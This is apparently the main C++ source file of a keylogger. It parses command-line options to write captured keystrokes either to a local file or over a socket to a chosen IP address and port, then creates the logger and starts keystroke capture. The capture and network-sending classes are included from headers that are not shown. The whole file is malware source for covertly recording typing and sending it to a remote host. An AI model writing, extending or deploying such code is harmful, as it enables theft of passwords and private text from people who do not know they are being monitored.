#include <iostream>
#include "KeyLogger.h"
#include "FileLogger.h"
#include "SocketLogger.h"

using namespace std;


typedef struct {
	LoggingTypes loggingType;
	int port;
	string ip;
	string filePath;
} KeyloggerArgs;


void ParseArgs(int argc, char* argv[], KeyloggerArgs* destArgs) {
	const string usage = "Usage: " + string(argv[0]) + " [-s, --socket / -f --file] [filename/ipaddr] [port (for socket only)]";

	if (argc < 2) {
		cout << usage;
		exit(1);
	}

	string loggingType = string(argv[1]);
	if (loggingType == "-s" || loggingType == "--socket") {
		if (argc != 4) {
			cout << usage;
			exit(1);
		}

		// TODO: Add format valdation
		destArgs->loggingType = LoggingTypes::Socket;
		destArgs->ip = argv[2];
		destArgs->port = atoi(argv[3]);
	}
	else if (loggingType == "-f" || loggingType == "--file") {
		if (argc != 3) {
			cout << usage;
			exit(1);
		}

		// TODO: add validation
		destArgs->loggingType = LoggingTypes::File;
		destArgs->filePath = argv[2];
	}
	else {
		cout << usage;
		exit(0);
	}
}


Logger* CreateLogger(KeyloggerArgs args) {
	switch (args.loggingType) {
		case LoggingTypes::File:
		{
			wchar_t wstringFilePath[512] = { 0 };
			mbstowcs_s(NULL, wstringFilePath, args.filePath.c_str(), sizeof wstringFilePath);
			return new FileLogger(wstringFilePath);
		}

		case LoggingTypes::Socket:
		{
			return new SocketLogger(args.ip, args.port);
		}
	}
}


int main(int argc, char* argv[]) {
	KeyloggerArgs keyloggerArgs;
	ParseArgs(argc, argv, &keyloggerArgs);

	Logger* logger = CreateLogger(keyloggerArgs);
    KeyLogger* keyLogger = new KeyLogger(logger);
	
	try {
		keyLogger->StartLogging();
	}
	catch (exception) {
		cout << "Exception received";
	}

	delete logger;
	delete keyLogger;
}
